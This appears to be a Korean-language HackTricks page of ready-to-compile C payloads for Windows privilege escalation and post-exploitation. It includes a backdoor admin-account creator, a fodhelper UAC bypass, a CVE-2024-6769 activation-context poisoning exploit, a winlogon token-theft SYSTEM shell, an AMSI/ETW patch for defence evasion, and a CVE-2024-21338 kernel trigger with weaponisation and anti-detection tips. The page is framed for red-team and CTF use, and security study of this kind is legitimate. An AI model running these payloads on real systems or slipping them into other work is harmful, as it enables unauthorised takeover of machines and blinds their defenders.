# 로컬 관리자 사용자 추가

{{#include ../../banners/hacktricks-training.md}}

이 페이지에는 Windows Local Privilege Escalation 또는 post-exploitation 중 유용하게 사용할 수 있는 **작고 독립적인 C 코드 조각**을 모아 두었습니다. 각 payload는 **복사하여 붙여넣기 쉽게** 설계되었으며, Windows API / C runtime만 필요하고 `i686-w64-mingw32-gcc` (x86) 또는 `x86_64-w64-mingw32-gcc` (x64)로 컴파일할 수 있습니다.

> ⚠️  이러한 payload는 프로세스가 작업을 수행하는 데 필요한 최소 권한(예: `SeDebugPrivilege`, `SeImpersonatePrivilege` 또는 UAC bypass를 위한 medium-integrity context)을 이미 보유하고 있다고 가정합니다. 이는 취약점을 악용하여 임의의 native code execution을 확보한 **red-team 또는 CTF 환경**을 대상으로 합니다.

---

## 로컬 관리자 사용자 추가
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
신뢰할 수 있는 binary **`fodhelper.exe`**가 실행되면 아래의 registry path를 조회하며, **`DelegateExecute` verb**를 필터링하지 않습니다. 해당 key 아래에 명령을 심으면 공격자는 파일을 디스크에 저장하지 않고도 UAC를 우회할 수 있습니다.<sup>[[1]](#references)</sup>

*`fodhelper.exe`가 조회하는 Registry path*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
권한이 상승된 `cmd.exe`를 실행하는 최소한의 PoC:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 및 Windows 11 23H2 (2025년 7월 패치)에서 테스트됨. Microsoft가 `DelegateExecute` 경로의 누락된 integrity check를 수정하지 않았기 때문에 이 bypass는 여전히 작동합니다.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning은 패치된 Windows 10/11 빌드에서도 여전히 작동합니다. `ctfmon.exe`가 높은 integrity의 trusted UI process로 실행되며, caller의 impersonated `C:` drive에서 로드하고 `CSRSS`가 cache한 모든 DLL redirection을 그대로 재사용하기 때문입니다. 악용 과정은 다음과 같습니다. `C:`를 attacker-controlled storage로 다시 지정하고, trojanized `msctf.dll`을 배치한 다음, `ctfmon.exe`를 실행하여 높은 integrity를 획득합니다. 그런 다음 `CSRSS`에 auto-elevated binary(예: `fodhelper.exe`)가 사용하는 DLL을 redirect하는 manifest를 cache하도록 요청하면, 다음 실행 시 UAC prompt 없이 payload가 상속됩니다.<sup>[[5]](#references)</sup>

실제 workflow:
1. 가짜 `%SystemRoot%\System32` tree를 준비하고 hijack할 legitimate binary(주로 `ctfmon.exe`)를 복사합니다.
2. `DefineDosDevice(DDD_RAW_TARGET_PATH)`를 사용하여 process 내부에서 `C:`를 remap하고, 변경 사항이 local에만 유지되도록 `DDD_NO_BROADCAST_SYSTEM`을 그대로 사용합니다.
3. fake tree에 DLL과 manifest를 배치하고, `CreateActCtx/ActivateActCtx`를 호출하여 manifest를 activation-context cache에 삽입한 다음, auto-elevated binary를 실행하여 redirected DLL이 shellcode로 직접 resolve되도록 합니다.
4. 작업이 끝나면 cache entry(`sxstrace ClearCache`)를 삭제하거나 reboot하여 attacker fingerprint를 제거합니다.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Cleanup tip: SYSTEM을 획득한 후 테스트할 때 `sxstrace Trace -logfile %TEMP%\sxstrace.etl`을 실행하고 이어서 `sxstrace Parse`를 호출하세요. 로그에서 manifest 이름이 보인다면 defenders도 확인할 수 있으므로, 실행할 때마다 경로를 변경하세요.

---

## token duplication을 통한 SYSTEM shell 생성 (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
현재 process가 **`SeDebug`** 및 **`SeImpersonate`** 권한을 **모두** 보유한 경우(많은 service account에서 일반적), `winlogon.exe`에서 token을 훔쳐 이를 복제한 다음 elevated process를 시작할 수 있습니다:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
더 자세한 작동 원리는 다음을 참조하세요:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
대부분의 최신 AV/EDR 엔진은 악성 동작을 검사하기 위해 **AMSI**와 **ETW**에 의존합니다. 현재 프로세스 내부에서 두 인터페이스를 초기에 패치하면 스크립트 기반 payload(예: PowerShell, JScript)가 스캔되는 것을 방지할 수 있습니다.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*위 패치는 프로세스 로컬에 적용되므로, 실행 후 새 PowerShell을 생성하면 AMSI/ETW inspection 없이 실행됩니다.*

---

## Create child as Protected Process Light (PPL)
`STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`을 사용해 생성 시점에 child에 PPL protection level을 요청합니다. 이는 documented API이며, target image가 요청된 signer class(Windows/WindowsLight/Antimalware/LSA/WinTcb)에 맞게 signed된 경우에만 성공합니다.<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
가장 일반적으로 사용되는 Levels:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Protection 열을 확인하여 Process Explorer/Process Hacker로 결과를 검증합니다.

---

## `appid.sys` Smart-Hash를 통한 Local Service -> Kernel (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys`는 `LOCAL SERVICE`로 실행 중인 호출자가 사용자 지정 function pointer를 제공할 경우 smart-hash 유지 관리 IOCTL을 허용하는 device object (`\\.\\AppID`)를 노출합니다. Lazarus는 이를 악용하여 PPL을 비활성화하고 임의의 driver를 load하고 있으므로, red team은 lab에서 사용할 수 있는 사전 제작 trigger를 준비해야 합니다.<sup>[[6]](#references)</sup>

운영 참고 사항:
- 여전히 `LOCAL SERVICE` token이 필요합니다. `SeImpersonatePrivilege`를 사용하여 `Schedule` 또는 `WdiServiceHost`에서 이를 탈취한 다음, ACL 검사가 통과하도록 device에 접근하기 전에 impersonate합니다.
- IOCTL `0x22A018`은 두 개의 callback pointer(query length + read function)가 포함된 struct를 요구합니다. 두 pointer를 token overwrite를 구성하거나 ring-0 primitive을 map하는 user-mode stub으로 지정하되, KernelPatchGuard가 chain 도중 crash하지 않도록 buffer를 RWX로 유지합니다.
- 성공한 후 impersonation에서 벗어나 revert하고 device handle을 닫습니다. 이제 defenders는 예상치 못한 `Device\\AppID` handle을 찾으므로, privilege를 획득하는 즉시 이를 닫습니다.

<details>
<summary>`appid.sys` smart-hash 악용을 위한 C - Skeleton trigger</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

무기화된 빌드를 위한 최소 수정: `VirtualAlloc`으로 RWX 섹션을 매핑하고, token duplication stub을 해당 위치에 복사한 다음, `KernelThunk = section`으로 설정하면 `DeviceIoControl`이 반환된 후 PPL 환경에서도 SYSTEM 권한을 얻게 됩니다.

---

## 참고 자료

- [1] [첫 번째 글: Welcome and fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL - 최소 PPL 프로세스 런처](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [새로운 Exploit Chain으로 가능한 Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus and the FudModule Rootkit: Admin-to-Kernel Zero-Day를 통한 BYOVD의 한계 돌파](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
